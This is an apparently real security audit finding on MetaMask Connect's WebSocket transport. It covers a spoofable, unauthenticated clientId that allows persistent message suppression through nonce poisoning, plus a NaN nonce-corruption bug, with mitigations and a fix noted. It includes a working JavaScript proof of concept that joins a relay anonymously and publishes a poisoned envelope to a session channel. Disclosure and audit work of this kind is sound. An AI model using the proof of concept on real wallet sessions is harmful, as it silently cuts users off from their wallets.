---
tags:
  - lang/solidity
  - platform/cyfrin
  - has/github
  - has/poc
  - severity/high
  - sector/wallet
protocol: "[[MetaMask]]"
auditors:
  - "[[0xaudron]]"
report: "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-03-05-cyfrin-metamask-connect-v2.0.md"
genome:
  - "[[missing-modifier]]"
  - "[[role-bypass]]"
  - "[[bridge-sender-auth]]"
---
# Nonce tracking lacks integrity protections as spoofed clientId enables persistent message suppression

- id: 65555
- impact: HIGH
- protocol: [[MetaMask]] Connect
- reporter: 0xaudron (Cyfrin)
- source: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-03-05-cyfrin-metamask-connect-v2.0.md

## Summary


The bug report describes a vulnerability in the WebSocket transport layer that can be exploited by an attacker to disrupt communication between a decentralized application (dApp) and a wallet. The vulnerability is caused by a lack of authentication in the `clientId` field of the transport envelope, which is used for deduplication. This allows an attacker to spoof the `clientId` and send a message with an inflated nonce, causing all subsequent legitimate messages from the real peer to be dropped. Additionally, the report highlights a potential issue where the outgoing nonce counter can be corrupted, leading to a permanent state where the affected client cannot send or receive messages. To mitigate these vulnerabilities, the report recommends implementing authentication in the transport envelope and guarding against `NaN` values in the nonce counter. The report also suggests restricting publish permissions on the relay server to prevent `clientId` spoofing. The bug has been fixed in MetaMask's mobile wallet protocol and verified by Cyfrin.

## Details

**Description:** The WebSocket transport layer wraps every message in a plaintext `TransportMessage` envelope containing a `clientId`, monotonic `nonce`, and the encrypted `payload`:
```js
// packages/core/src/transport/websocket/index.ts:16-20
type TransportMessage = {
    clientId: string;
    nonce: number;
    payload: string;
};
```
On the receiving side, `_handleIncomingMessage` uses this envelope for per-sender deduplication. It maintains a persistent map of `{clientId → highestSeenNonce}` per channel and drops any message whose nonce is not strictly greater than the last recorded value:
```js
// packages/core/src/transport/websocket/index.ts:246-254
const latestNonces = await this.storage.getLatestNonces(channel);
const latestNonce = latestNonces.get(message.clientId) || 0;

if (message.nonce > latestNonce) {
    latestNonces.set(message.clientId, message.nonce);
    await this.storage.setLatestNonces(channel, latestNonces);
    this.emit("message", { channel, data: message.payload });
}
// If message.nonce <= latestNonce, it's a duplicate and we ignore it.
```

This deduplication logic is correct for its intended purpose. However, the `clientId` field in the transport envelope is unauthenticated as it is not covered by `ECIES` encryption (which only protects payload) and there is no signature or MAC binding the `clientId` to the actual sender. The only validation performed is a self-echo check:
```js
// packages/core/src/transport/websocket/index.ts:240-243
// Ignore our own messages reflected from the server.
if (message.clientId === this.storage.getClientId()) {
    return;
}
```

This check prevents processing our own reflected messages but does not verify that the claimed `clientId` actually belongs to the sender.
Since the `Centrifugo` relay server allows anonymous connections, subscriptions, and publishing to any channel without authentication:
```js
// backend/config.json:9, 30-33
"allow_anonymous_connect_without_token": true,
"allow_subscribe_for_anonymous": true,
"allow_publish_for_anonymous": true,
```

An attacker can subscribe to a victim's session channel, observe the legitimate peer's `clientId` from any published transport envelope, and then publish a spoofed envelope with that clientId and an inflated nonce value. This permanently poisons the receiver's dedup state, causing all subsequent legitimate messages from the real peer to be silently dropped.

Additionally, the outgoing nonce counter in `getNextNonce` uses `parseInt` without a `NaN` guard:
```js
// packages/core/src/transport/websocket/store.ts:42-49
async getNextNonce(channel: string): Promise<number> {
    const key = this.getNonceKey(channel);
    const value = await this.kvstore.get(key);
    const currentNonce = value ? parseInt(value, 10) : 0;
    const nextNonce = currentNonce + 1;
    await this.kvstore.set(key, nextNonce.toString());
    return nextNonce;
}
```

If the stored value is ever corrupted to a non-numeric string, parseInt returns `NaN`, which propagates permanently: `NaN + 1 = NaN, NaN.toString()` = "NaN", and `parseInt("NaN", 10)` = `NaN` on every subsequent read. On the receiving side, `message.nonce > NaN` evaluates to `false` for any value, so all messages from the corrupted sender could be permanently dropped.

**Impact:**
1. An attacker with no credentials can permanently and silently sever the communication between a dApp and wallet by publishing a single spoofed transport envelope. The poisoned nonce state is persisted to `kvstore` and survives application restarts. The victim receives no error, legitimate messages are silently classified as "duplicates" and dropped.

The attack can be further amplified by Centrifugo's message history (`history_size: 20`, `history_ttl: 300s`, `force_recovery: true`): the poisoned message persists in the channel history and is replayed to any client that subscribes or reconnects within the TTL window via `_fetchHistory`, extending the blast radius beyond currently-connected clients.

```js
	/**
	 * Fetches historical messages for a channel to ensure no data is missed on first subscribe.
	 */
	private async _fetchHistory(sub: ISubscription, channel: string): Promise<void> {
		try {
			const history = await sub.history({ limit: HISTORY_FETCH_LIMIT });
			for (const pub of history.publications) {
				await this._handleIncomingMessage(channel, pub.data as string);
			}
		} catch (error) {
			// Centrifuge may throw an error (code 11) if the connection closes
			// during a history fetch. This is expected on disconnect and can be ignored.
			if ((error as { code?: number })?.code === 11) return;
			this.emit("error", new TransportError(ErrorCode.TRANSPORT_HISTORY_FAILED, `Failed to fetch history for channel ${channel}: ${JSON.stringify(error)}`));
		}
	}
```

2. If the `nonce` storage is corrupted to a `non-numeric` value (e.g., via a storage race condition, partial write failure, or external storage manipulation), the affected client enters a permanent state where it can neither send nor receive messages on that channel.

**Proof of Concept:**
1. Nonce poisoning via spoofed `clientId`:
```js
import { Centrifuge } from "centrifuge";

// Step 1: Connect anonymously to the relay server
const attacker = new Centrifuge("ws://relay-server-url/connection/websocket");
attacker.connect();

// Step 2: Subscribe to the victim's session channel to observe traffic
const targetChannel = "session:<known-session-uuid>";
const sub = attacker.newSubscription(targetChannel);

sub.on("publication", (ctx) => {
    // Step 3: Extract the legitimate peer's clientId from any observed message
    const envelope = JSON.parse(ctx.data);
    const legitimateClientId = envelope.clientId;

    // Step 4: Publish a spoofed envelope with the same clientId and an inflated nonce
    const poison = JSON.stringify({
        clientId: legitimateClientId,
        nonce: Number.MAX_SAFE_INTEGER,
        payload: "irrelevant" // Will fail ECIES decryption, but nonce is already persisted
    });
    attacker.publish(targetChannel, poison);
    // Victim's latestNonces map now has {legitimateClientId: 9007199254740991}
    // All future real messages from the peer (nonce 5, 6, 7...) are silently dropped
});

sub.subscribe();
```

2. NaN corruption:
```js
// Simulate storage corruption (e.g., from a partial write or race condition)
await kvstore.set("nonce:<clientId>:<channel>", "corrupted");

// Next call to getNextNonce:
const value = await kvstore.get(key);           // "corrupted"
const currentNonce = parseInt("corrupted", 10); // NaN
const nextNonce = NaN + 1;                      // NaN
await kvstore.set(key, NaN.toString());          // Stores "NaN"
// Permanently stuck: parseInt("NaN", 10) = NaN on every subsequent read

// On receiver side, for any incoming nonce value:
// message.nonce > NaN → false (always) → all messages dropped forever
```

**Recommended Mitigation:**
1. Authenticate the transport envelope. Include a lightweight MAC (e.g., HMAC-SHA256) over the `clientId` and nonce fields using a key derived from the session, so the receiver can verify the sender's identity at the transport layer before updating dedup state:
```js
// On send (index.ts _process):
const mac = hmacSha256(sessionDerivedKey, `${clientId}:${nonce}`);
const message: TransportMessage = { clientId, nonce, payload, mac };

// On receive (index.ts _handleIncomingMessage):
const expectedMac = hmacSha256(sessionDerivedKey, `${message.clientId}:${message.nonce}`);
if (!timingSafeEqual(message.mac, expectedMac)) return; // Drop unauthenticated envelopes
// Only THEN update latestNonces
```

2. Guard parseInt against `NaN`. Add a `NaN` check with a fallback to prevent permanent corruption of the nonce counter:
```js
async getNextNonce(channel: string): Promise<number> {
    const key = this.getNonceKey(channel);
    const value = await this.kvstore.get(key);
    const currentNonce = value ? parseInt(value, 10) : 0;
    const nextNonce = (Number.isNaN(currentNonce) ? 0 : currentNonce) + 1;
    await this.kvstore.set(key, nextNonce.toString());
    return nextNonce;
}
```

3. Restrict relay server publish permissions. Remove `allow_publish_for_anonymous` from the Centrifugo configuration and require authenticated publish with a server-issued token that binds the `clientId` to the connection and prevent `clientId` spoofing at the transport level.

**MetaMask:** Fixed in [PR69](https://github.com/MetaMask/mobile-wallet-protocol/pull/69).

**Cyfrin:** Verified.

\clearpage
